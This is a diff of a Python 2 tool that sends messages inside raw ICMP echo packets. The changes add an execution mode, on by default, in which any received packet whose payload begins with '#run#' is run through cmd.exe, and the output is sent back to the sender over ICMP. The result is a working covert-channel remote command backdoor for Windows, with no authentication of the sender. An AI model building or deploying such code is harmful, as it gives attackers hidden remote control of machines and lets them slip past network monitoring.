@@ -4,21 +4,36 @@ import sys
 import threading
 import random
 import os
-import select
 import subprocess
-import urllib2
+import select
 
-def get_webpage(url):
-	f = open("bla.html","w")
-	f.write(urllib2.urlopen(url).read())
-	f.close()
-	return urllib2.urlopen(url).read()
+#todo: differnet colors for command output, standar output...
+#class bcolors:
+#    HEADER = '\033[95m'
+#    OKBLUE = '\033[94m'
+#    OKGREEN = '\033[92m'
+#    WARNING = '\033[93m'
+#    FAIL = '\033[91m'
+#    ENDC = '\033[0m'
+#    BOLD = '\033[1m'
+#    UNDERLINE = '\033[4m'
 
+	
 def run_cmd(command):
+	#print "executing: " + command
 	proc = subprocess.Popen('cmd.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
 	stdout, stderr = proc.communicate(command+'\n')
-	return stdout
-
+	return stdout	#return output
+	
+def execution(source, command):
+	output = run_cmd(command)
+	if(len(output) > 0):
+			#split output and remove header
+			splittedOutput = output.split(command, 1)
+			cOutput = splittedOutput[1]
+			#todo: add try catch for larger output
+			send_message(source, "[CMD-Out] " + cOutput)
+	
 def checksum(source_string):
     sum = 0
     countTo = (len(source_string)/2)*2
@@ -41,37 +56,30 @@ def checksum(source_string):
 
     return answer
 
-def send_message(inputData):
-	global control
-	splitted = inputData.split(' ', 1)
+def send_message(dest, message):
+	#splitted = inputData.split(' ', 1)
 	
-	dest = socket.gethostbyname(splitted[0]) #destination IP addr
+	dest = socket.gethostbyname(dest) #destination IP addr
+	message = message#.encode("utf-8") #encoded message
 	
-	all_message = splitted[1]#.encode("utf-8") #encoded message
-	a = 0
-	b = len(all_message) // 930
-	c = control
-	control += 1
-	control %= 10
-	for i in range(0,len(all_message),930):
-		message = "\\" + str(a) + "\\" + str(b) + "\\" + str(c) +"\\"+ all_message[i:min(len(all_message),i+930)]#
-		a += 1
-		
-		my_checksum = 0
-		
-		id = random.randint(1, 0xffff)
-		# Header is type (8), code (8), checksum (16), id (16), sequence (16)
-		header = struct.pack("bbHHh", 8, 0, my_checksum, id, 1)
-		my_checksum = checksum(header + message)
-		
-		header = struct.pack("bbHHh", 8, 0, socket.htons(my_checksum), id, 1)
-		packet = header + message
-		#open socket
-		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
+	my_checksum = 0
+	
+	id = random.randint(1, 0xffff)
+	
+	# Header is type (8), code (8), checksum (16), id (16), sequence (16)
+	header = struct.pack("bbHHh", 8, 0, my_checksum, id, 1)
+	
+	my_checksum = checksum(header + message)
+	
+	header = struct.pack("bbHHh", 8, 0, socket.htons(my_checksum), id, 1)
+	packet = header + message
 
-		#bind to public interface (ip, port) and send packet
-		s.bind((INTERFACE, 0)) 
-		s.sendto(str(packet), (dest, 1))
+	#open socket
+	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
+	
+	#bind to public interface (ip, port) and send packet
+	s.bind((INTERFACE, 0)) 
+	s.sendto(str(packet), (dest, 1))
 	
 
 def receive_message(sniffer):
@@ -91,47 +99,12 @@ def receive_message(sniffer):
 		type = "Request"
 	else:
 		type = "Unknown("+type+")"
+	
 	msgData = icmpData#.decode("utf-8")
-	if msgData[0] != '\\':
-		return ""
-	a, b, c, msgData = msgData[1:].split("\\", 3)
-	a = int(a)
-	b = int(b)
-	c = int(c)
 	
-	if (addr[0] in messages):
-		if (messages[addr[0]][1] != b or messages[addr[0]][3] != c):
-			del messages[addr[0]]
-	if (addr[0] not in messages):
-		msg = []
-		for i in range(0, b + 1):
-			msg.append(" ")
-		messages[addr[0]] = [msg,b,-1,c]
-	messages[addr[0]][0][a] = msgData
-	messages[addr[0]][2] += 1
-	if messages[addr[0]][1] > messages[addr[0]][2]:
-		return ""
+	if execMode == True and len(msgData) > 5 and msgData[:5] == "#run#":#and type == "Request" #be carefull without that one
+		execution(addr[0], msgData[5:])
 	
-	msgData = ""
-	for i in messages[addr[0]][0]:
-		msgData = msgData + i
-	del messages[addr[0]]
-	
-	if len(msgData) > 5 and msgData[:6] == "#run# ":
-		output = run_cmd(msgData[6:])
-		send_message(addr[0]+ " " + output)
-	
-	if len(msgData) > 5 and msgData[:6] == "#web# ":
-		webPage = get_webpage(msgData[6:])
-		send_message(addr[0]+ " #save# " + msgData[6:] + "/\\" + webPage)
-	
-	if len(msgData) > 6 and msgData[:7] == "#save# ":
-		name, webpage = msgData[7:].split("/\\", 1)
-		f = open("web.html", 'w')
-		f.write(webpage)
-		f.close()
-		return ""
-
 	message = "[" + addr[0] + "] [" + type + "]: " + msgData
 	return message
 
@@ -155,14 +128,12 @@ def message_receiver():
 
 
 if __name__ == "__main__":
-	control = 0
-	
-	global messages
-	messages = dict()
-
 	global INTERFACE
+	global execMode
+	
 	INTERFACE = "192.168.1.12" #default interface, used if input empty
-
+	execMode = True		#run commands in cmd (messages: #run#command)		
+	
 	newIface = raw_input("Enter interface ip: ")
 	if(len(newIface) > 0):
 		INTERFACE = newIface
@@ -176,6 +147,7 @@ if __name__ == "__main__":
 	while True:
 		try:
 			msg_send = raw_input()
-			send_message(msg_send)
+			parts = msg_send.split(' ', 1)
+			send_message(parts[0], parts[1])
 		except KeyboardInterrupt:
 			sys.exit()
